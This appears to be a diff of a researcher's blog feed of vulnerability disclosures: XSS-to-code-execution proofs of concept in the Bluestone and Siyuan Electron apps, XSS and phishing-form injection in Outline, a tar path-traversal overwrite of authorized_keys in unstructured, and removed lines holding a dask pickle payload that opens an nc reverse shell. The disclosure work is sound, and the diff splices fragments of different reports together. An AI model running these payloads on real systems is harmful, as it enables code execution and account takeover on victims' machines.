 <p><a href="https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/actions/invoice_ocr.py#L79">_unzip#L79</a></p>
 
-<p><a href="https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/utils/file.py#L39">write#L39</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Command injection via unsafe pickle.loads in dask.array.from_npy_stack in NLTK(Informative)</title><link href="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-dask.html" rel="alternate" type="text/html" title="Command injection via unsafe pickle.loads in dask.array.from_npy_stack in NLTK(Informative)" /><published>2024-06-24T10:31:06+08:00</published><updated>2024-06-24T10:31:06+08:00</updated><id>http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-dask</id><content type="html" xml:base="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-dask.html"><![CDATA[<h2 id="name">Name</h2>
+<p><a href="https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/utils/file.py#L39">write#L39</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">XSS in Bluestone Electron App when rendering mermaid class diagram Leading to RCE(Just Thanks)</title><link href="http://localhost:4000/xss/2024/06/04/xss-in-bluestone-render-mermaid-diagram.html" rel="alternate" type="text/html" title="XSS in Bluestone Electron App when rendering mermaid class diagram Leading to RCE(Just Thanks)" /><published>2024-06-04T10:31:06+08:00</published><updated>2024-06-04T10:31:06+08:00</updated><id>http://localhost:4000/xss/2024/06/04/xss-in-bluestone-render-mermaid-diagram</id><content type="html" xml:base="http://localhost:4000/xss/2024/06/04/xss-in-bluestone-render-mermaid-diagram.html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Due to outdated mermaid 10.0.2 is used to render diagrams, a XSS in class diagram is able to trigger, chained with insecure configuration of windows electron app, attacker is able to execute code in victims’ local system.</p>
+
+<h3 id="details">Details</h3>
+<p>Bluestone is using <a href="https://github.com/1943time/bluestone/blob/07535f86adebe8f7f00c299ca60792189eff2a64/package.json#L67">mermaid 10.0.2</a> to render mermaid diagram. <a href="https://github.com/Milkdown/milkdown/issues/1267#issuecomment-2018032986">This issue</a> have discussed the XSS in mermaid below 10.9.0 when rendering the node names of classDiagram. Specifically, The names of node are not fully sanitized which leads to  injection of XSS payload.</p>
+
+<p>Besides, the electron app sets <code class="language-plaintext highlighter-rouge">nodeIntegration</code> to <a href="https://github.com/1943time/bluestone/blob/07535f86adebe8f7f00c299ca60792189eff2a64/src/main/api.ts#L33"><code class="language-plaintext highlighter-rouge">true</code></a> which is harmful, according to <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/electron-desktop-apps#introduction">this attack</a>, a XSS can be escalated to execute command on victims’ local system.</p>
+
+<h3 id="poc">PoC</h3>
+
+<ol>
+  <li>
+    <p>Download latest Bluestone v0.22.0 windows electron app from <a href="https://github.com/1943time/bluestone/releases/download/v0.22.0/Bluestone-win-x64.exe">official repo</a>, and install the application:</p>
+  </li>
+  <li>
+    <p>Open the payload markdown file using the Bluestone app, the payload is following:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> classDiagram
+ Class01 &lt;|-- `AveryLngClas&lt;img src='x' onerror=require('child_process').exec('calc');&gt;`
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>The calculator poped up.</p>
+
+    <p><img src="/assets/images/mermaid/bluestone-rce.png" alt="rce" /></p>
+  </li>
+</ol>
+
+<h3 id="impact">Impact</h3>
+
+<p>Client side code execution.</p>
+
+<h3 id="reference">Reference</h3>
+
+<p><a href="https://github.com/Milkdown/milkdown/issues/1267#issuecomment-2018032986">https://github.com/Milkdown/milkdown/issues/1267#issuecomment-2018032986</a></p>
+
+<h3 id="occurence">Occurence</h3>
+
+<p><a href="https://github.com/1943time/bluestone/blob/07535f86adebe8f7f00c299ca60792189eff2a64/package.json#L67">https://github.com/1943time/bluestone/blob/07535f86adebe8f7f00c299ca60792189eff2a64/package.json#L67</a></p>
+
+<p><a href="https://github.com/1943time/bluestone/blob/07535f86adebe8f7f00c299ca60792189eff2a64/src/main/api.ts#L33">https://github.com/1943time/bluestone/blob/07535f86adebe8f7f00c299ca60792189eff2a64/src/main/api.ts#L33</a></p>
+
+<h3 id="mitigation">Mitigation</h3>
+
+<ol>
+  <li>Upgrade the mermaid to latest version which is <code class="language-plaintext highlighter-rouge">10.9.1</code>.</li>
+  <li>Disable <code class="language-plaintext highlighter-rouge">nodeIntegration</code> in electron app.</li>
+</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Summary Due to outdated mermaid 10.0.2 is used to render diagrams, a XSS in class diagram is able to trigger, chained with insecure configuration of windows electron app, attacker is able to execute code in victims’ local system.]]></summary></entry><entry><title type="html">XSS in Siyuan Electron App when rendering mermaid block diagram Leading to RCE(Just Thanks)</title><link href="http://localhost:4000/xss/2024/06/04/xss-in-siyuan-render-mermaid-diagram.html" rel="alternate" type="text/html" title="XSS in Siyuan Electron App when rendering mermaid block diagram Leading to RCE(Just Thanks)" /><published>2024-06-04T10:31:06+08:00</published><updated>2024-06-04T10:31:06+08:00</updated><id>http://localhost:4000/xss/2024/06/04/xss-in-siyuan-render-mermaid-diagram</id><content type="html" xml:base="http://localhost:4000/xss/2024/06/04/xss-in-siyuan-render-mermaid-diagram.html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Due to outdated mermaid 10.8.0 is used to render block diagrams, a XSS in block diagram is able to trigger, chained with insecure configuration of windows electron app, attacker is able to execute code in victims local system.</p>
+
+<h3 id="details">Details</h3>
+<p>Siyuan is using <a href="https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/changelogs/v3.0.0/v3.0.0.md?plain=1#L30">mermaid 10.8.0</a> to render mermaid diagram. However, <a href="https://github.com/mermaid-js/mermaid/blob/d6ccd93cf207a30bbd45edf39fd29afdbb87b05e/cypress/platform/xss25.html#L98">the test html</a> in mermaid repo showed that the edge label names of <a href="https://github.com/mermaid-js/mermaid/pull/5221">new block diagram</a> is not sanitized and could lead to XSS. The name of node is not fully sanitized which leads to  injection of XSS payload.</p>
+
+<p>Besides, the electron app sets <code class="language-plaintext highlighter-rouge">nodeIntegration</code> to <a href="https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/electron/main.js#L305"><code class="language-plaintext highlighter-rouge">true</code></a> which is harmful, according to <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/electron-desktop-apps#introduction">this attack</a>, a XSS can be escalated to execute command on victims’ local system.</p>
+
+<h3 id="poc">PoC</h3>
+
+<ol>
+  <li>
+    <p>Download latest Siyuan-3.0.17 windows electron app from <a href="https://release.liuyun.io/siyuan/siyuan-3.0.17-win.exe">official site</a>, and install the application:</p>
+  </li>
+  <li>Create new document, and type <code class="language-plaintext highlighter-rouge">/Mermaid</code> command to insert mermaid diagram using following payload:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  block-beta
+  `A-- "X&lt;img src=x onerror=require('child_process').exec('calc');&gt;" --&gt;B
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>The calculator poped up.</p>
+
+    <p><img src="/assets/images/mermaid/siyuan-rce.png" alt="rce" /></p>
+  </li>
+</ol>
+
+<h3 id="impact">Impact</h3>
+
+<p>Client side code execution.</p>
+
+<h3 id="reference">Reference</h3>
+
+<p><a href="https://github.com/siyuan-note/siyuan/issues/11645">https://github.com/siyuan-note/siyuan/issues/11645</a></p>
+
+<p><a href="https://github.com/mermaid-js/mermaid/blob/d6ccd93cf207a30bbd45edf39fd29afdbb87b05e/cypress/platform/xss25.html#L98">https://github.com/mermaid-js/mermaid/blob/d6ccd93cf207a30bbd45edf39fd29afdbb87b05e/cypress/platform/xss25.html#L98</a></p>
+
+<h3 id="occurence">Occurence</h3>
+
+<p><a href="https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/electron/main.js#L305">https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/electron/main.js#L305</a></p>
+
+<p><a href="https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/changelogs/v3.0.0/v3.0.0.md?plain=1#L30">https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/changelogs/v3.0.0/v3.0.0.md?plain=1#L30</a></p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Summary Due to outdated mermaid 10.8.0 is used to render block diagrams, a XSS in block diagram is able to trigger, chained with insecure configuration of windows electron app, attacker is able to execute code in victims local system.]]></summary></entry><entry><title type="html">XSS in Outline when rendering mermaid diagrams(No Security Impact!)</title><link href="http://localhost:4000/xss/2024/06/02/xss-in-outline-render-mermaid-diagram.html" rel="alternate" type="text/html" title="XSS in Outline when rendering mermaid diagrams(No Security Impact!)" /><published>2024-06-02T10:31:06+08:00</published><updated>2024-06-02T10:31:06+08:00</updated><id>http://localhost:4000/xss/2024/06/02/xss-in-outline-render-mermaid-diagram</id><content type="html" xml:base="http://localhost:4000/xss/2024/06/02/xss-in-outline-render-mermaid-diagram.html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Due to outdated mermaid plugin is used to render diagrams, a known XSS in mermaid classDiagram is able to trigger in outline mermaid diagram.</p>
+
+<h3 id="details">Details</h3>
+<p>Outline is using <a href="https://github.com/outline/outline/blob/cb0f03d69820d9cd3422252cb511c7dfeed61904/package.json#L151">mermaid 9.3.0</a> to render mermaid diagram. However, <a href="https://github.com/Milkdown/milkdown/issues/1267#issuecomment-2018032986">this issue</a> have discussed the XSS in mermaid below 10.9.0 when rendering the node names of classDiagram. The name of node is not fully sanitized which leads to  injection of XSS payload.</p>
+
+<h3 id="poc">PoC</h3>
+
+<ol>
+  <li>Use <code class="language-plaintext highlighter-rouge">/Mermaid Diagram</code> to insert following xss payload:</li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  classDiagram
+  Class01 &lt;|-- `AveryLongClass&lt;img src='x' onerror=alert(document.domain)&gt;`
+  Class03 *-- Class04
+  Class05 o-- Class06
+  Class07 .. Class08
+  Class01 : size()
+  Class01 : int chimp
+  Class01 : int gorilla
+</code></pre></div></div>
+<ol>
+  <li>
+    <p>Open chrome devtools, you can see CSP is blocking the XSS from executing.</p>
+
+    <p><img width="762" alt="outline-xss" src="https://github.com/outline/outline/assets/33363160/360801a9-0964-46f2-9244-5b2d4466da72" />
+ <img width="647" alt="outline-xss2" src="https://github.com/outline/outline/assets/33363160/519f4340-187a-401f-a2be-356b8d6e1513" /></p>
+  </li>
+  <li>
+    <p>Use following paylod to inject forms for phishing:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> classDiagram
+ Class01 &lt;|-- `&lt;form action='https://google.com'&gt;&lt;label for='fname'&gt;First name:&lt;/label&gt;&lt;br&gt;&lt;input type='text' id='fname' name='fname' value='John'&gt;&lt;br&gt;&lt;label for='lname'&gt;Last name:&lt;/label&gt;&lt;br&gt;&lt;input type='text' id='lname' name='lname' value='Doe'&gt;&lt;br&gt;&lt;br&gt;&lt;input type='submit' value='Submit'&gt;&lt;/form&gt;`
+</code></pre></div>    </div>
+
+    <p><img width="672" alt="xss-phishing" src="https://github.com/outline/outline/assets/33363160/4e495246-59bf-44b3-a41d-eb9459cb2a69" /></p>
+  </li>
+  <li>
+    <p>Use following to inject css styles:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> classDiagram
+ Class01 &lt;|-- `&lt;h1&gt;inject styles&lt;/h1&gt;&lt;style&gt;div{color:red!important;font-size:22px;}&lt;/style&gt;`
+ Class01 : int gorilla
+</code></pre></div>    </div>
+    <p><img width="648" alt="css-injection" src="https://github.com/outline/outline/assets/33363160/928803ff-e90b-4d64-8180-0a50e688fc87" /></p>
+  </li>
+  <li>
+    <p>The poc can be found in <a href="https://sunflowers101.getoutline.com/s/1784c475-adf0-427e-9231-377b6bec6140">this page</a>.</p>
+  </li>
+</ol>
+
+<h3 id="impact">Impact</h3>
+
+<p>In official outline page, the XSS is blocked by CSP, but attacker can still inject html payload to phishing, or using css injection to get csrf token. Besides, if self-host outline is not configured with CSP, the XSS will be triggered.</p>
+
+<h3 id="reference">Reference</h3>
+
+<p><a href="https://github.com/Milkdown/milkdown/issues/1267">https://github.com/Milkdown/milkdown/issues/1267</a></p>
+
+<p><a href="https://milkdown.dev/playground?text=AYi2FMCdQQwSwCYCgDGAbGBnTAROMBzSGUJAYQ2wAYBGAAgB4AfAWhbuAEEA3KATwAyAewB2BClkwM4oAnUyQUAXgDkADxV1RUSEMhKYaKABcAFAiEoArhBHGAdCiFCA1nHABKAHzBylTFQAzHQAVGx0EtQALH6SVACsWuGRAQBssdQA7HT29hH%2BVAAcGQH0AFzycABe4KYeJbR0FXB2dCgAFjIADg3ldC3GdAR6cGgYSCC%2BSEA%3D">https://milkdown.dev/playground?text=AYi2FMCdQQwSwCYCgDGAbGBnTAROMBzSGUJAYQ2wAYBGAAgB4AfAWhbuAEEA3KATwAyAewB2BClkwM4oAnUyQUAXgDkADxV1RUSEMhKYaKABcAFAiEoArhBHGAdCiFCA1nHABKAHzBylTFQAzHQAVGx0EtQALH6SVACsWuGRAQBssdQA7HT29hH%2BVAAcGQH0AFzycABe4KYeJbR0FXB2dCgAFjIADg3ldC3GdAR6cGgYSCC%2BSEA%3D</a></p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Summary Due to outdated mermaid plugin is used to render diagrams, a known XSS in mermaid classDiagram is able to trigger in outline mermaid diagram.]]></summary></entry><entry><title type="html">Arbitrary File Overwrite via unstructured-ingest in unstructured(Just Thanks)</title><link href="http://localhost:4000/file-overwrite/2024/05/29/arbitrary-file-overwrite-in-unstructured.html" rel="alternate" type="text/html" title="Arbitrary File Overwrite via unstructured-ingest in unstructured(Just Thanks)" /><published>2024-05-29T10:31:06+08:00</published><updated>2024-05-29T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/05/29/arbitrary-file-overwrite-in-unstructured</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/05/29/arbitrary-file-overwrite-in-unstructured.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
-  <p>Command injection via unsafe pickle.loads in dask.array.from_npy_stack</p>
+  <p>Arbitrary File Overwrite via unstructured-ingest with uncompress enabled in unstructured</p>
 </blockquote>
 
 <h2 id="weakness">Weakness</h2>
 
 <blockquote>
-  <p>CWE-94: Code Injection</p>
+  <p>CWE-22: Path Traversal</p>
 </blockquote>
 
 <h2 id="severity">Severity</h2>
@@ -853,229 +547,204 @@ await role.run(Message(content="Invoicing date", instruct_content=InvoicePath(fi
 <h2 id="version">Version</h2>
 
 <blockquote>
-  <p>2024.6.2</p>
+  <p>0.14.3</p>
 </blockquote>
 
 <h2 id="description">Description</h2>
 
-<p>The dask api <a href="https://docs.dask.org/en/stable/generated/dask.array.from_npy_stack.html#dask.array.from_npy_stack"><code class="language-plaintext highlighter-rouge">dask.array.from_npy_stack</code></a> is used to load dask array from stack of npy files. It loads dask arrays from a directory which contains a <code class="language-plaintext highlighter-rouge">info</code> file. The <code class="language-plaintext highlighter-rouge">info</code> file saves the information of the dask array. And <code class="language-plaintext highlighter-rouge">from_npy_stack</code> uses <code class="language-plaintext highlighter-rouge">pickle.load</code> method to load the <code class="language-plaintext highlighter-rouge">info</code> file which is a pickle file. If a victim loads a malicious <code class="language-plaintext highlighter-rouge">info</code> pickle file, command injection can be achieved.</p>
+<p>The unstructured ingest provide extra <a href="https://docs.unstructured.io/open-source/ingest/source-connectors/sftp"><code class="language-plaintext highlighter-rouge">sftp</code></a> and <a href="https://docs.unstructured.io/open-source/ingest/source-connectors/google-cloud-storage"><code class="language-plaintext highlighter-rouge">gcs</code></a> modules to batch process all documents in remote cloud storages. The <a href="https://github.com/Unstructured-IO/unstructured/blob/3158169585b0ce8bbe784762133b244271a9dec8/unstructured/ingest/utils/compression.py#L76"><code class="language-plaintext highlighter-rouge">process_compressed_doc</code></a> is called to extract the compressed tarball files to local file system. However, the function does not adequately prevent malicious tar files from performing path traversal attacks. This can allow the downloading of malicious tar.gz files that can overwrite any file.</p>
 
-<p>The vulnerable function: <a href="https://github.com/dask/dask/blob/ff2488aec44d641696e0b7aa41ed9e995c710705/dask/array/core.py#L5708"><code class="language-plaintext highlighter-rouge">dask.array.from_npy_stack#L5708</code></a></p>
+<p>Using unstructured python sdk, a victim may download malicious tarball from remote cloud storages. The call stack is following: <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/pipeline/doc_factory.py#L10"><code class="language-plaintext highlighter-rouge">DocFactory.run</code></a> -&gt; <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/connector/fsspec/fsspec.py#L262"><code class="language-plaintext highlighter-rouge">FsspecSourceConnector.get_ingest_docs</code></a> -&gt; <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L83"><code class="language-plaintext highlighter-rouge">CompressionSourceConnectorMixin.process_compressed_doc</code></a> -&gt; <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L33"><code class="language-plaintext highlighter-rouge">uncompress_file</code></a> -&gt; <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L66"><code class="language-plaintext highlighter-rouge">uncompress_tar_file</code></a>, The <code class="language-plaintext highlighter-rouge">uncompress_tar_file</code> calls <code class="language-plaintext highlighter-rouge">tarball.extractall</code> without sanitizing the members in tarball, causing members with absolute names or relative names will extracted and written outside target folder.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def from_npy_stack(dirname, mmap_mode="r"):
-    """Load dask array from stack of npy files
+<p>The <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L66"><code class="language-plaintext highlighter-rouge">uncompress_tar_file</code></a> function:</p>
 
-    Parameters
-    ----------
-    dirname: string
-        Directory of .npy files
-    mmap_mode: (None or 'r')
-        Read data in memory map mode
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def uncompress_tar_file(tar_filename: str, path: Optional[str] = None) -&gt; str:
+    head, tail = os.path.split(tar_filename)
+    for ext in TAR_FILE_EXT:
+        if tail.endswith(ext):
+            tail = tail[: -(len(ext))]
+            break
 
-    See Also
-    --------
-    to_npy_stack
-    """
-    with open(os.path.join(dirname, "info"), "rb") as f:
-        # vulnerable to command injection !!!!
-        info = pickle.load(f)
+    path = path if path else os.path.join(head, f"{tail}-tar-uncompressed")
+    logger.info(f"extracting tar {tar_filename} -&gt; {path}")
+    with tarfile.open(tar_filename, "r:gz") as tfile:
+        tfile.extractall(path=path)
+    return path
+</code></pre></div></div>
 
-    dtype = info["dtype"]
-    chunks = info["chunks"]
-    axis = info["axis"]
+<p>The Python documentation explains us that tarfiles may have absolute filenames starting with / which could overwite files in system.</p>
 
-    name = "from-npy-stack-%s" % dirname
-    keys = list(product([name], *[range(len(c)) for c in chunks]))
-    values = [
-        (np.load, os.path.join(dirname, "%d.npy" % i), mmap_mode)
-        for i in range(len(chunks[axis]))
-    ]
-    dsk = dict(zip(keys, values))
-
-    return Array(dsk, name, chunks, dtype)
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Warning: Never extract archives from untrusted sources without prior inspection. 
+It is possible that files are created outside of path, 
+e.g. members that have absolute filenames starting with "/" or filenames with two dots "..".
 </code></pre></div></div>
 
 <h2 id="proof-of-concept">Proof of Concept</h2>
 
-<p>Firstly, create a malicious pickle file. Use following snippets to create a malicous <code class="language-plaintext highlighter-rouge">info</code> pickle file:</p>
+<p>For simplicity, I use sftp ingest to batch process documents from a test sftp server.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pickle
-import os
+<p>First, let’s start a simple sftp server using docker from <a href="https://hub.docker.com/r/atmoz/sftp/"><code class="language-plaintext highlighter-rouge">atmoz/sftp</code></a>. The server is listen at my local network <code class="language-plaintext highlighter-rouge">10.15.0.5:2222</code></p>
 
-class RCE:
-    def __reduce__(self):
-        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
-               '/bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 1234 &gt; /tmp/f')
-        return os.system, (cmd,)
-
-with open('info', 'wb') as f:
-    pickle.dump(RCE(), f)
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run -p 2222:22 -d atmoz/sftp foo:pass:::upload
 </code></pre></div></div>
 
-<p>I have uploaded the <a href="https://raw.githubusercontent.com/sunriseXu/onnx/main/payload.pickle"><code class="language-plaintext highlighter-rouge">info</code></a> to github for testing.</p>
+<p>Next, create a malicous tar file using following command:</p>
 
-<h2 id="start-attack">Start attack</h2>
-
-<p>Install latest dask:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install dask
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar --absolute-names -czvf hack.tar.gz /home/kali/.ssh/authorized_keys
 </code></pre></div></div>
 
-<p>Create a malicious dask array directory.</p>
+<p>Then, upload <code class="language-plaintext highlighter-rouge">hack.tar.gz</code> to previously created sftp server.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>example
-    |__info
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># login to sftp server, account: foo, password: pass
+sftp -P 2222 foo@10.15.0.5
+
+# cd into upload folder
+sftp&gt; cd upload
+
+# upload hack.tar.gz
+sftp&gt; put hack.tar.gz
+sftp&gt; ls -la
+-rw-r--r--    1 1000     100          2531 May 29 05:35 hack.tar.gz
 </code></pre></div></div>
 
-<p>Use following snippets to trigger the unsafe <code class="language-plaintext highlighter-rouge">pickle.loads</code> command injection:</p>
+<p>Install <code class="language-plaintext highlighter-rouge">structrue</code> and <a href="https://docs.unstructured.io/open-source/ingest/source-connectors/sftp"><code class="language-plaintext highlighter-rouge">structure[sftp]</code></a>(using python3.10):</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import dask.array as da
-da.from_npy_stack('example')
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install unstructured
+pip install "unstructured[sftp]"
 </code></pre></div></div>
 
-<p>After the command executed, we can check the <code class="language-plaintext highlighter-rouge">/tmp/f</code> file is created.</p>
+<p>Using <a href="https://docs.unstructured.io/open-source/ingest/source-connectors/sftp">python snippets</a> in offical document to fetch all documents from sftp server, note that with <code class="language-plaintext highlighter-rouge">uncompress=True</code> set, save as <code class="language-plaintext highlighter-rouge">unstructured_sftp.py</code>:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ls -la /tmp/f
-prw-r--r-- 1 kali kali 0 Jun 24 19:48 /tmp/f
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from unstructured.ingest.interfaces import (
+    PartitionConfig,
+    ProcessorConfig,
+    ReadConfig,
+)
+from unstructured.ingest.runner import SftpRunner
+
+if __name__ == "__main__":
+    runner = SftpRunner(
+        processor_config=ProcessorConfig(
+            verbose=True,
+            output_dir="sftp-output",
+            num_processes=2,
+        ),
+        read_config=ReadConfig(),
+        partition_config=PartitionConfig(),
+        connector_config=SimpleSftpConfig(
+            access_config=SftpAccessConfig(
+                username="foo",
+                password="pass",
+            ),
+            remote_url="sftp://10.15.0.5:2222/upload",
+            recursive=True,
+            uncompress=True
+        ),
+    )
+    runner.run()
 </code></pre></div></div>
-<h2 id="colab">Colab</h2>
 
-<p>Tested on google colab: <a href="https://colab.research.google.com/drive/1XaF82Sgt1nmY0hhSu0l_PBnFTQuCyNLq?usp=sharing">https://colab.research.google.com/drive/1XaF82Sgt1nmY0hhSu0l_PBnFTQuCyNLq?usp=sharing</a></p>
+<p>Lauch the attack, the file <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> in local system is overwritten</p>
 
-<p><img src="http://live.staticflickr.com/65535/53822138335_9a3095507b_k.jpg" alt="image" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python unstructured_sftp.py
 
-<h2 id="impact">Impact</h2>
+&gt; cat /home/kali/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
+</code></pre></div></div>
 
-<p>This vulnerability can have severe consequences. If victims load a malicious dask array folder using <code class="language-plaintext highlighter-rouge">dask.array.from_npy_stack</code>, command injection can be achieved on victims’ mechine.</p>
+<p>Or just using <a href="https://docs.unstructured.io/open-source/ingest/source-connectors/sftp"><code class="language-plaintext highlighter-rouge">unstructured-ingest sftp</code> shell command</a> with <code class="language-plaintext highlighter-rouge">--uncompress</code> enabled:</p>
 
-<h2 id="occurrences">Occurrences</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; unstructured-ingest \
+  sftp \
+  --remote-url sftp://10.15.0.5:2222/upload \
+  --username "foo" \
+  --password "pass" \
+  --num-processes 2 \
+  --recursive \
+  --uncompress \
+  --verbose
 
-<p><a href="https://github.com/dask/dask/blob/ff2488aec44d641696e0b7aa41ed9e995c710705/dask/array/core.py#L5708">dask.array.from_npy_stack#L5708</a></p>]]></content><author><name></name></author><category term="command-injection" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Command injection via unsafe pickle.loads in LdaModel.load in gensim(Informative)</title><link href="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-gensim.html" rel="alternate" type="text/html" title="Command injection via unsafe pickle.loads in LdaModel.load in gensim(Informative)" /><published>2024-06-24T10:31:06+08:00</published><updated>2024-06-24T10:31:06+08:00</updated><id>http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-gensim</id><content type="html" xml:base="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-gensim.html"><![CDATA[<h2 id="name">Name</h2>
 
-<blockquote>
-  <p>Command injection via unsafe pickle.loads in LdaModel.load</p>
-</blockquote>
+&gt; cat /home/kali/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
+</code></pre></div></div>
 
-<h2 id="weakness">Weakness</h2>
+<h2 id="platform">Platform</h2>
 
-<blockquote>
-  <p>CWE-94: Code Injection</p>
-</blockquote>
+<p>I noticed the platform Data Ingestion Source Connectors also have <code class="language-plaintext highlighter-rouge">uncompress</code> option, For example:</p>
 
-<h2 id="severity">Severity</h2>
+<p><a href="https://docs.unstructured.io/platform/platform-source-connectors/sftp-storage">sftp-storage</a></p>
 
-<blockquote>
-  <p>High (8.8)</p>
-</blockquote>
+<p><img src="/assets/images/bughunter/unstructured/Source-SFTP.png" alt="sftp" /></p>
 
-<h2 id="version">Version</h2>
+<p><a href="https://docs.unstructured.io/platform/platform-source-connectors/google-cloud">google cloud storage</a></p>
 
-<blockquote>
-  <p>4.3.2</p>
-</blockquote>
+<p><img src="/assets/images/bughunter/unstructured/Source-Google-Cloud.png" alt="gc" /></p>
 
-<h2 id="description">Description</h2>
+<h2 id="fix">Fix</h2>
 
